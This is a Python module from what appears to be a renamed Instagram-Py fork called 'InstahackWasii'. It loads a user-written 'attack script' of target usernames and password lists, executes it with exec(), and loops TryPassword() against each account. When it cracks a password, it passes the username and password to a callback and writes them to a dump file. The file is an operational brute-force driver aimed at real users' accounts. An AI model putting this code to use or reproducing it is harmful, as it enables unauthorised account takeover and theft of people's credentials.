# The MIT License.
# Copyright (C) 2018 The Future Shell , Antony Jr.
#
# @filename    : InstahackWasiiScript.py
# @description : Handles Instagram-Py Attack Scripts.
import os
from .InstahackWasiiCLI import InstahackWasiiCLI
from .InstahackWasiiSession import InstahackWasiiSession, DEFAULT_PATH
from .InstahackWasiiInstance import InstahackWasiiInstance
from .InstahackWasiiDumper import InstahackWasiiDumper
from datetime import datetime
from .AppInfo import appInfo as AppInformation


class InstahackWasiiScript():
    script_code = None
    pService = None
    cli = None
    threads = {}  # not actually threads but a simple dict
    no_of_threads = len(threads)

    def __init__(self, script, PortableService=None):
        self.cli = InstahackWasiiCLI(appinfo=AppInformation,
                                  started=datetime.now(),
                                  verbose_level=0,
                                  username='',
                                  PortableService=PortableService
                                  )
        self.cli.PrintHeader()
        self.cli.PrintDatetime()
        self.pService = PortableService

        if not os.path.isfile(script):
            self.cli.ReportError("no script found at {}".script)

        with open(script, 'r') as f:
            self.script_code = compile(f.read(), script, 'exec')

    def run(self):
        try:
            exec(self.script_code, globals())
            count = 0
            for i in usernames:
                try:
                    cli = InstahackWasiiCLI(
                        appinfo=AppInformation,
                        started=datetime.now(),
                        verbose_level=i['verbose'],
                        username=i['id'],
                        PortableService=self.pService
                    )
                except:
                    cli = InstahackWasiiCLI(
                        appinfo=AppInformation,
                        started=datetime.now(),
                        verbose_level=0,
                        username=i['id'],
                        PortableService=self.pService
                    )

                INSTAPY_CONFIG = DEFAULT_PATH
                if self.pService is not None:
                    if self.pService.isSetInstahackWasiiPortable():
                        INSTAPY_CONFIG = self.pService.getInstahackWasiiConfigPath()

                try:
                    session = InstahackWasiiSession(
                        i['id'],
                        i['password_list'],
                        INSTAPY_CONFIG,
                        DEFAULT_PATH,
                        cli
                    )
                except:
                    try:
                        session = InstahackWasiiSession(
                            i['id'],
                            global_password_list,
                            INSTAPY_CONFIG,
                            DEFAULT_PATH,
                            cli
                        )
                    except:
                        self.cli.ReportError(
                            "invalid script :: No Password list is Mentioned in the Script!")
                try:
                    session.ReadSaveFile(i['continue'])
                except:
                    session.ReadSaveFile(False)

                instance = InstahackWasiiInstance(cli, session)

                self.threads[count] = {
                    "terminated": False,
                    "instance": instance
                }
                try:
                    self.threads[count]['callback'] = i['callback']
                except:
                    try:
                        self.threads[count]['callback'] = global_callback
                    except:
                        self.threads[count]['callback'] = None
                count += 1
        except Exception as e:
            self.cli.ReportError("invalid script :: {}".format(e))

        # Finished Parsing the Custom Attack Script , Start The Attack.
        self.no_of_threads = len(self.threads)
        while self.no_of_threads is not 0:
            for i in self.threads:
                if self.threads[i]['terminated'] is True:
                    continue  # next iteration
                elif self.threads[i]['instance'].PasswordFound():
                    if self.threads[i]['callback'] is not None:
                        self.threads[i]['callback'](
                            self.threads[i]['instance'].session.username,
                            self.threads[i]['instance'].session.CurrentPassword()
                        )
                        self.threads[i]['instance'].session.WriteDumpFile(
                            {
                                "id": self.threads[i]['instance'].session.username,
                                "password": self.threads[i]['instance'].session.CurrentPassword(),
                                "started": str(self.threads[i]['instance'].cli.started)
                            }
                        )

                    self.threads[i]['terminated'] = True
                    self.no_of_threads -= 1
                else:
                    self.threads[i]['instance'].TryPassword()
